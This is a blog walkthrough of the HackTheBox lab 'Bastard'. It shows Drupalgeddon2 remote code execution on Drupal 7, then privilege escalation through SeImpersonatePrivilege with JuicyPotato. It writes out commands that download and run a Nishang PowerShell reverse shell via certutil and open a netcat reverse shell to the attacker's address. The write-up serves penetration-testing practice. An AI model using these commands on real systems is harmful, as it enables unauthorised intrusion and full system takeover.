<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Bastard HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/bastard-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-01-18T08:18:51+00:00">January 18, 2021</time><time class="updated" datetime="2025-06-23T15:57:23+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “<strong>Bastard</strong>“. It’s available at HackTheBox for penetration testing practice. This laboratory is of an easy level, but with adequate basic knowledge to break the laboratories and if we pay attention to all the details we find during the examination it will not be complicated. The credit for making this lab goes to <strong>ch4p</strong>. Let’s get started and learn how to break it down successfully.</span></p>
<p><span style="color: #000000;">Level: <strong>Medium</strong></span></p>
<p><span style="color: #000000;">Since these labs are available on the <strong>HackTheBox</strong> website.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Searchsploit</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">Drupal 7.x – Drupalgeddon2 – RCE</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Abuse of permission in SeImpersonatePrivilege in the system</span></li>
</ul>
<ul>
<li><span style="color: #000000;">Capture the flag</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Reconnaissance</strong></span></h3>
<p><span style="color: #000000;">As always, before we start our scan with nmap, we will put the <strong>IP address of the machine</strong> into our “<strong>/etc/hosts</strong>” and work with the domain “<strong>bastard.htb</strong>“.</span></p>
<p><span style="color: #000000;">We will use the following command to perform a quick scan to all ports.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap --min-rate 5000 -p- -Pn -n -sS -T5 bastard.htb</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S6GDGCnI-zs/YAVBYawgCAI/AAAAAAAAs_I/hKkzn1W9xeQTbCoyM4baR7k2YhrmUa-QgCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Afterwards, we will launch another scan with scripts and versions, it will be very fast since we will specify the ports of the previously detected services.</span></p>
<p><span style="color: #000000;">We can also list that there is a <strong>CMS</strong> deployed with <strong>Drupal 7</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XKfpZRtu4v4/YAVBqAmwYwI/AAAAAAAAs_Q/ygdtb3R2v1YlqEa7L1ZTwjfKqE6oAPUvgCLcBGAsYHQ/s16000/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">We access the web resource, it is indeed a <strong>Drupal</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WoYfFrK_5BA/YAVB0_iJYLI/AAAAAAAAs_U/_Fl4hXgJmK4K0_737NQX9CiM-r6zz818QCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">We list in the source code the exact version of drupal.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sApFHsj3rmc/YAVB7duZiSI/AAAAAAAAs_c/90hlNDS8w2Ybh-PoJNPyPlEoPM1Shj5zACLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Then, we use the “<strong>Searchsploit</strong>” tool and list several exploits that allow us to <u>execute remote code (RCE) without authentication</u>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cnOGb2dAKlA/YAVCBQnn-FI/AAAAAAAAs_g/Khomas42qX8uQKx4h6csEWImy1zllEwdACLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">We will use the following exploit found in google:</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;"><strong>Exploit</strong></span>: </span></h3>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://github.com/lorddemon/drupalgeddon2</pre>
<p><span style="color: #000000;">We do a proof of concept and see that the site is vulnerable.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python drupalgeddon2.py -h http://bastard.htb -c 'whoami'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--hX5spXddYg/YAVCJMhWQYI/AAAAAAAAs_k/E8BNvL_UjnQRCCZtxcfAC0ypzMW5DukcwCLcBGAsYHQ/s16000/6.png"/></span></p>
<h3><span style="color: #800000;">Exploiting</span></h3>
<p><span style="color: #000000;">We will execute two commands:</span></p>
<ol>
<li><span style="color: #000000;">We will raise in our kali a server with python (<em>python3 -m http.server 80</em>), in the file “<strong>m3.ps1</strong>” is the famous <strong><a style="color: #000000;" href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiRmemJs6PuAhW5UxUIHfL3A68QFjAAegQIARAC&amp;url=https%3A%2F%2Fgithub.com%2Fsamratashok%2Fnishang&amp;usg=AOvVaw1eUfcDY3TOqfs66bZJ3icZ">nishan</a></strong> reverse shell, we will execute the exploit with the following command that will download our reverse shell.</span></li>
<li><span style="color: #000000;">We will execute the second command to run with a bypassed powershell to get our reverse shell to run.</span></li>
</ol>
<p><span style="color: #000000;"><strong><u>Command 1:</u></strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python drupalgeddon2.py -h http://bastard.htb -c 'certutil -urlcache -split -f http://10.10.XX.XX/m3.ps1'</pre>
<p><span style="color: #000000;"><strong><u>Command 2:</u></strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python drupalgeddon2.py -h http://bastard.htb -c 'powershell -nop -ep bypass .\m3.ps1'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5vxJxk3kXwk/YAVCQwlGfaI/AAAAAAAAs_w/JLTjY2ANvsAt49QeWUOfFq873CzSL1lTwCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">We will have a reverse shell of powershell in our kali.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GyoCEdQIIKc/YAVCXo0_uXI/AAAAAAAAs_0/KNr1ZhvxPpYTluAkJO3HHWq2FquBcDwYwCLcBGAsYHQ/s16000/8.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation (user and administrator)</strong></span></h3>
<p><span style="color: #000000;">This machine can be exploited in more ways, but I chose this path.</span></p>
<p><span style="color: #000000;">We use the command “<strong>whoami /priv</strong>” to check the privileges with our user and see that we have permissions to the privilege “<strong>SeImpersonatePrivilege</strong>“. We already know this one from other machines that we have solved, we know that we can impersonate the user “<strong>nt authority\system</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vAfjMMd1mAo/YAVCfJ4pF_I/AAAAAAAAs_4/X0AcdFtC96UIT4TVZPyoX9tOnhl5JyuRwCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Now, we check that we are in the operating system since we will need to check the list of CLSID to use the exploit.</span></p>
<p><span style="color: #000000;">As we can see, we are in a <strong>Windows Server 2008 R2</strong>, of which there are several kernel-level exploits that we could also use.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-27OjuXLFG8A/YAVClYEsAYI/AAAAAAAAtAA/tQ2_uOtgVDIDLQ_gGy2uuQEdpPI59IsYgCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">We download the exploit “<strong>JuicyPotato</strong>” and visit the Github’s CLSID list, we transfer to the victim machine the file “<strong>JuicyPotato.exe</strong>” and the netcat binary “<strong>nc.exe</strong>“. Then we use the exploit specifying the path of our netcat and specifying our IP address and port to send us a reverse shell as “administrator” in a netcat is listening to our kali.</span></p>
<p><span style="color: #000000;"><strong><u>Exploit and CLSID list</u></strong>:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://github.com/ohpe/juicy-potato</pre>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -urlcache -split -f http://10.10.XX.XX/JuicyPotato.exe
certutil -urlcache -split -f http://10.10.XX.XX/nc.exe
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.XX.XX 555" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mT2b3vTsP4M/YAVCsv8W_iI/AAAAAAAAtAI/k8OQtpwlw8AFSn7fhnplMlHiGgYT4BXsQCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Great! We are already “<strong>nt authority\system</strong>” and we can read our flags.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lQuKGRwp138/YAVCxq29OoI/AAAAAAAAtAQ/mxCYCsioG-MynzxpYZhTrRWYdgqRxOotACLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks. Contacted on <span style="color: #0000ff;"><strong>LinkedIn </strong></span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/David_Uton">Twitter</a></strong></span>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
<!-- YARPP Thumbnails -->
<h3>Related posts:</h3>
<div class="yarpp-thumbnails-horizontal">
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/explore-hackthebox-walkthrough/" title="Explore Hackthebox Walkthrough">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Explore Hackthebox Walkthrough</span></a>
<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/paper-hackthebox-walkthrough/" title="Paper HackTheBox Walkthrough">
<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Paper HackTheBox Walkthrough</span></a>
</div>
</div>
            </div><!-- .entry-content -->
            <footer class="post-footer entry-footer">
                                                
            </footer><!-- .entry-footer -->
            
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/android-penetration-testing-webview-attacks/" rel="prev">Android Penetration Testing: WebView Attacks</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/cascade-hackthebox-walkthrough/" rel="next">Cascade HacktheBox Walkthrough</a></div></div>
	</nav>        </div>
